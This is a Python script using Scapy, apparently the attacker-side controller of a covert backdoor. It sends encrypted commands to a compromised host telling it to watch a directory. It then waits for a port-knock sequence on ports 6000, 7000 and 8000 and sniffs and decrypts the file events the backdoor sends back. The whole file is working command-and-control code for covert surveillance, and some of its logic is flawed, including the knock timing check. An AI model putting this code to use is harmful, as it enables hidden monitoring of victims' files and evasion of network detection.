#   Watch Directory
#
#   Details -
#   [details of program here]
#
#   Usage   -
#   Run from attacker.sh
#
#   Author  Date        Description
#   GSM     DEC-06      Rest
#

#   Imports
from argparse   import ArgumentParser
from scapy.all  import *
from utils import *
import sys
import time

#   Constants
maxpackets = 500

#   Global Variables
Knocked = False

#   Set Arguments
parser = ArgumentParser ( )
parser.add_argument ( "-m", "--mode",   dest = "mode",      help = "Mode of Execution ( download, watch )" )
parser.add_argument ( "-d", "--dir",    dest = "directory", help = "Directory to Watch" )
arguments = parser.parse_args ( )

def ListenForNotifyEvents ( ):   

 #   Send Packet Looking To Watch Directory
    payload = arguments.mode + " " + arguments.directory
    encrypted_payload=encrypt(payload)
    if ( protocol == "tcp" ):
        packet  = IP ( src = source, dst = dest ) / TCP ( sport = int ( port ), dport = int ( port ) ) / encrypted_payload
    elif ( protocol == "udp" ):
        packet  = IP ( src = source, dst = dest ) / UDP ( sport = int ( port ), dport = int ( port ) ) / encrypted_payload
    else:
        print ( "[-] Invalid Protocol Selected" )
        return

    send ( packet )

    payload = ""
    #   While knocked is false, listen for knock. If knocked is true, listen and process responses.
    while ( True ):
        print ( "[+] Listening For Knock" )
        first_knock = sniff ( filter = "port " + str(6000), count = 1 )
        second_knock = sniff ( filter = "port " + str(7000), count = 1 )
        third_knock = sniff ( filter = "port " + str(8000), count = 1 )

        if ( first_knock[0].time - second_knock[0].time < 5 and second_knock[0].time - third_knock[0].time < 5 ):
            print ( "[+] Knock Received" )
            # Send Packet to let backdoor know that knock was received
            payload = "knock is accepted"
            if ( protocol == "tcp" ):
                packet  = IP ( src = source, dst = dest ) / TCP ( sport = int ( port ), dport = int ( port ) ) / encrypt ( payload )
                send ( packet )
                Knocked = True
                break

    print ( "[+] Directory Watcher Listening (30 seconds)" )
    s = time.time ( ) + 30

    while ( time.time ( ) < s ):
        capture = sniff ( filter = "host " + source + " and port " + port, count = 2, timeout = 5 )
        if ( len ( capture ) != 0 ):
            data = decrypt ( capture[0].payload.load )
            #   Print Event
            print ( "\n" + data )

#   Main
print ( "[+] Watch Directory" )

#   Read Configuration File
with open ( "config.txt", "r" ) as sendfile:
    config = sendfile.readlines ( )

count = 1
for line in config:
    if ( count == 1 ):
        source = line.rstrip ( )
    elif ( count == 2 ):
        dest = line.rstrip ( )
    elif ( count == 3 ):
        port = line.rstrip ( )
    elif ( count == 4 ):
        protocol = line.rstrip ( )
    elif ( count == 5 ):
        timeout = float ( line.rstrip ( ) )

    count += 1

ListenForNotifyEvents ( )
